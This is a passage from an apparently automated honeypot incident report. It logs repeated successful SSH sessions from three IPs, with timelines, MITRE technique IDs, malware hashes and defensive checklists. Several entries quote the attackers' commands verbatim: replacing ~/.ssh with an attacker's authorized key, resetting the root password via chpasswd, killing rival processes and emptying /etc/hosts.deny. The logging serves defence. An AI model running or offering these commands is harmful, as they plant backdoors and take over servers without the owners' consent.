**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9503d9e664

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:42 |
| **Last Seen** | 2026-06-14 06:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:42:48` | `cowrie.session.connect` |
| `2026-06-14 06:42:48` | `cowrie.client.version` |
| `2026-06-14 06:42:48` | `cowrie.client.kex` |
| `2026-06-14 06:42:49` | `cowrie.login.success` |
| `2026-06-14 06:42:50` | `cowrie.session.params` |
| `2026-06-14 06:42:50` | `cowrie.command.input` |
| `2026-06-14 06:42:50` | `cowrie.command.failed` |
| `2026-06-14 06:42:50` | `cowrie.log.closed` |
| `2026-06-14 06:42:50` | `cowrie.session.params` |
| `2026-06-14 06:42:50` | `cowrie.command.input` |
| `2026-06-14 06:42:51` | `cowrie.session.file_download` |
| `2026-06-14 06:42:51` | `cowrie.log.closed` |
| `2026-06-14 06:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a0429c00d4

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:42 |
| **Last Seen** | 2026-06-14 06:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:42:54` | `cowrie.session.connect` |
| `2026-06-14 06:42:54` | `cowrie.client.version` |
| `2026-06-14 06:42:54` | `cowrie.client.kex` |
| `2026-06-14 06:42:55` | `cowrie.login.success` |
| `2026-06-14 06:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb2fa368ab44

| Field | Detail |
|---|---|
| **Source IP** | `119.96.174[.]235` |
| **First Seen** | 2026-06-14 06:45 |
| **Last Seen** | 2026-06-14 06:46 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:aztJDTOsaqkx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:45:35` | `cowrie.session.connect` |
| `2026-06-14 06:45:35` | `cowrie.client.version` |
| `2026-06-14 06:45:35` | `cowrie.client.kex` |
| `2026-06-14 06:45:40` | `cowrie.login.success` |
| `2026-06-14 06:45:44` | `cowrie.session.params` |
| `2026-06-14 06:45:44` | `cowrie.command.input` |
| `2026-06-14 06:45:44` | `cowrie.command.failed` |
| `2026-06-14 06:45:44` | `cowrie.log.closed` |
| `2026-06-14 06:45:45` | `cowrie.session.params` |
| `2026-06-14 06:45:45` | `cowrie.command.input` |
| `2026-06-14 06:45:46` | `cowrie.session.file_download` |
| `2026-06-14 06:45:46` | `cowrie.log.closed` |
| `2026-06-14 06:45:57` | `cowrie.session.params` |
| `2026-06-14 06:45:57` | `cowrie.command.input` |
| `2026-06-14 06:45:57` | `cowrie.log.closed` |
| `2026-06-14 06:45:58` | `cowrie.session.params` |
| `2026-06-14 06:45:58` | `cowrie.command.input` |
| `2026-06-14 06:45:58` | `cowrie.log.closed` |
| `2026-06-14 06:45:58` | `cowrie.session.params` |
| `2026-06-14 06:45:58` | `cowrie.command.input` |
| `2026-06-14 06:45:58` | `cowrie.session.file_download` |
| `2026-06-14 06:45:58` | `cowrie.log.closed` |
| `2026-06-14 06:45:59` | `cowrie.session.params` |
| `2026-06-14 06:45:59` | `cowrie.command.input` |
| `2026-06-14 06:45:59` | `cowrie.log.closed` |
| `2026-06-14 06:45:59` | `cowrie.session.params` |
| `2026-06-14 06:45:59` | `cowrie.command.input` |
| `2026-06-14 06:46:00` | `cowrie.log.closed` |
| `2026-06-14 06:46:00` | `cowrie.session.params` |
| `2026-06-14 06:46:00` | `cowrie.command.input` |
| `2026-06-14 06:46:00` | `cowrie.command.input` |
| `2026-06-14 06:46:00` | `cowrie.log.closed` |
| `2026-06-14 06:46:00` | `cowrie.session.params` |
| `2026-06-14 06:46:00` | `cowrie.command.input` |
| `2026-06-14 06:46:00` | `cowrie.log.closed` |
| `2026-06-14 06:46:01` | `cowrie.session.params` |
| `2026-06-14 06:46:01` | `cowrie.command.input` |
| `2026-06-14 06:46:01` | `cowrie.log.closed` |
| `2026-06-14 06:46:01` | `cowrie.session.params` |
| `2026-06-14 06:46:01` | `cowrie.command.input` |
| `2026-06-14 06:46:02` | `cowrie.log.closed` |
| `2026-06-14 06:46:02` | `cowrie.session.params` |
| `2026-06-14 06:46:02` | `cowrie.command.input` |
| `2026-06-14 06:46:02` | `cowrie.log.closed` |
| `2026-06-14 06:46:03` | `cowrie.session.params` |
| `2026-06-14 06:46:03` | `cowrie.command.input` |
| `2026-06-14 06:46:03` | `cowrie.log.closed` |
| `2026-06-14 06:46:03` | `cowrie.session.params` |
| `2026-06-14 06:46:03` | `cowrie.command.input` |
| `2026-06-14 06:46:03` | `cowrie.log.closed` |
| `2026-06-14 06:46:04` | `cowrie.session.params` |
| `2026-06-14 06:46:04` | `cowrie.command.input` |
| `2026-06-14 06:46:04` | `cowrie.log.closed` |
| `2026-06-14 06:46:04` | `cowrie.session.params` |
| `2026-06-14 06:46:04` | `cowrie.command.input` |
| `2026-06-14 06:46:04` | `cowrie.log.closed` |
| `2026-06-14 06:46:05` | `cowrie.session.params` |
| `2026-06-14 06:46:05` | `cowrie.command.input` |
| `2026-06-14 06:46:05` | `cowrie.log.closed` |
| `2026-06-14 06:46:05` | `cowrie.session.params` |
| `2026-06-14 06:46:05` | `cowrie.command.input` |
| `2026-06-14 06:46:05` | `cowrie.log.closed` |
| `2026-06-14 06:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.174[.]235` to AbuseIPDB if not already reported
- [ ] Block `119.96.174[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50a72356be77

| Field | Detail |
|---|---|
| **Source IP** | `119.96.174[.]235` |
| **First Seen** | 2026-06-14 06:49 |
| **Last Seen** | 2026-06-14 06:54 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:49:22` | `cowrie.session.connect` |
| `2026-06-14 06:49:22` | `cowrie.client.version` |
| `2026-06-14 06:49:23` | `cowrie.client.kex` |
| `2026-06-14 06:49:24` | `cowrie.login.success` |
| `2026-06-14 06:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.174[.]235` to AbuseIPDB if not already reported
- [ ] Block `119.96.174[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb5430fe96e

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:58 |
| **Last Seen** | 2026-06-14 06:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:58:41` | `cowrie.session.connect` |
| `2026-06-14 06:58:41` | `cowrie.client.version` |
| `2026-06-14 06:58:41` | `cowrie.client.kex` |
| `2026-06-14 06:58:42` | `cowrie.login.success` |
| `2026-06-14 06:58:42` | `cowrie.session.params` |
| `2026-06-14 06:58:42` | `cowrie.command.input` |
| `2026-06-14 06:58:42` | `cowrie.command.failed` |
| `2026-06-14 06:58:43` | `cowrie.log.closed` |
| `2026-06-14 06:58:43` | `cowrie.session.params` |
| `2026-06-14 06:58:43` | `cowrie.command.input` |
| `2026-06-14 06:58:43` | `cowrie.session.file_download` |
| `2026-06-14 06:58:43` | `cowrie.log.closed` |
| `2026-06-14 06:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75d84692d22

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 06:58 |
| **Last Seen** | 2026-06-14 06:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:58:47` | `cowrie.session.connect` |
| `2026-06-14 06:58:47` | `cowrie.client.version` |
| `2026-06-14 06:58:47` | `cowrie.client.kex` |
| `2026-06-14 06:58:48` | `cowrie.login.success` |
| `2026-06-14 06:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-470369dbcb27

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 06:59 |
| **Last Seen** | 2026-06-14 06:59 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:59:27` | `cowrie.session.connect` |
| `2026-06-14 06:59:27` | `cowrie.client.version` |
| `2026-06-14 06:59:27` | `cowrie.client.kex` |
| `2026-06-14 06:59:28` | `cowrie.login.success` |
| `2026-06-14 06:59:29` | `cowrie.session.params` |
| `2026-06-14 06:59:29` | `cowrie.command.input` |
| `2026-06-14 06:59:29` | `cowrie.command.failed` |
| `2026-06-14 06:59:30` | `cowrie.log.closed` |
| `2026-06-14 06:59:30` | `cowrie.session.params` |
| `2026-06-14 06:59:30` | `cowrie.command.input` |
| `2026-06-14 06:59:31` | `cowrie.session.file_download` |
| `2026-06-14 06:59:31` | `cowrie.log.closed` |
| `2026-06-14 06:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b07e740ccfe7

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 06:59 |
| **Last Seen** | 2026-06-14 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 06:59:35` | `cowrie.session.connect` |
| `2026-06-14 06:59:35` | `cowrie.client.version` |
| `2026-06-14 06:59:35` | `cowrie.client.kex` |
| `2026-06-14 06:59:36` | `cowrie.login.success` |
| `2026-06-14 06:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d5ee6d1d88c

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:04 |
| **Last Seen** | 2026-06-14 07:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:04:05` | `cowrie.session.connect` |
| `2026-06-14 07:04:05` | `cowrie.client.version` |
| `2026-06-14 07:04:05` | `cowrie.client.kex` |
| `2026-06-14 07:04:06` | `cowrie.login.success` |
| `2026-06-14 07:04:06` | `cowrie.session.params` |
| `2026-06-14 07:04:06` | `cowrie.command.input` |
| `2026-06-14 07:04:06` | `cowrie.command.failed` |
| `2026-06-14 07:04:07` | `cowrie.log.closed` |
| `2026-06-14 07:04:07` | `cowrie.session.params` |
| `2026-06-14 07:04:07` | `cowrie.command.input` |
| `2026-06-14 07:04:08` | `cowrie.session.file_download` |
| `2026-06-14 07:04:08` | `cowrie.log.closed` |
| `2026-06-14 07:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6850ac78901c

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:04 |
| **Last Seen** | 2026-06-14 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:04:11` | `cowrie.session.connect` |
| `2026-06-14 07:04:11` | `cowrie.client.version` |
| `2026-06-14 07:04:11` | `cowrie.client.kex` |
| `2026-06-14 07:04:12` | `cowrie.login.success` |
| `2026-06-14 07:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.167.237[.]191` to AbuseIPDB if not already reported
- [ ] Block `190.167.237[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df399b79582

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 07:06 |
| **Last Seen** | 2026-06-14 07:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:06:27` | `cowrie.session.connect` |
| `2026-06-14 07:06:27` | `cowrie.client.version` |
| `2026-06-14 07:06:27` | `cowrie.client.kex` |
| `2026-06-14 07:06:29` | `cowrie.login.success` |
| `2026-06-14 07:06:30` | `cowrie.session.params` |
| `2026-06-14 07:06:30` | `cowrie.command.input` |
| `2026-06-14 07:06:30` | `cowrie.command.failed` |
| `2026-06-14 07:06:30` | `cowrie.log.closed` |
| `2026-06-14 07:06:31` | `cowrie.session.params` |
| `2026-06-14 07:06:31` | `cowrie.command.input` |
| `2026-06-14 07:06:31` | `cowrie.session.file_download` |
| `2026-06-14 07:06:31` | `cowrie.log.closed` |
| `2026-06-14 07:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16ee7f502568

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 07:06 |
| **Last Seen** | 2026-06-14 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:06:35` | `cowrie.session.connect` |
| `2026-06-14 07:06:35` | `cowrie.client.version` |
| `2026-06-14 07:06:35` | `cowrie.client.kex` |
| `2026-06-14 07:06:37` | `cowrie.login.success` |
| `2026-06-14 07:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6847c31fa841

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 07:09 |
| **Last Seen** | 2026-06-14 07:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:09:58` | `cowrie.session.connect` |
| `2026-06-14 07:09:58` | `cowrie.client.version` |
| `2026-06-14 07:09:59` | `cowrie.client.kex` |
| `2026-06-14 07:10:00` | `cowrie.login.success` |
| `2026-06-14 07:10:01` | `cowrie.session.params` |
| `2026-06-14 07:10:01` | `cowrie.command.input` |
| `2026-06-14 07:10:01` | `cowrie.command.failed` |
| `2026-06-14 07:10:01` | `cowrie.log.closed` |
| `2026-06-14 07:10:02` | `cowrie.session.params` |
| `2026-06-14 07:10:02` | `cowrie.command.input` |
| `2026-06-14 07:10:02` | `cowrie.session.file_download` |
| `2026-06-14 07:10:02` | `cowrie.log.closed` |
| `2026-06-14 07:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6c1fb23ff51

| Field | Detail |
|---|---|
| **Source IP** | `186.57.3[.]137` |
| **First Seen** | 2026-06-14 07:10 |
| **Last Seen** | 2026-06-14 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:10:06` | `cowrie.session.connect` |
| `2026-06-14 07:10:06` | `cowrie.client.version` |
| `2026-06-14 07:10:07` | `cowrie.client.kex` |
| `2026-06-14 07:10:08` | `cowrie.login.success` |
| `2026-06-14 07:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.57.3[.]137` to AbuseIPDB if not already reported
- [ ] Block `186.57.3[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95590ef86b43

| Field | Detail |
|---|---|
| **Source IP** | `190.167.237[.]191` |
| **First Seen** | 2026-06-14 07:12 |
| **Last Seen** | 2026-06-14 07:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 07:12:39` | `cowrie.session.connect` |
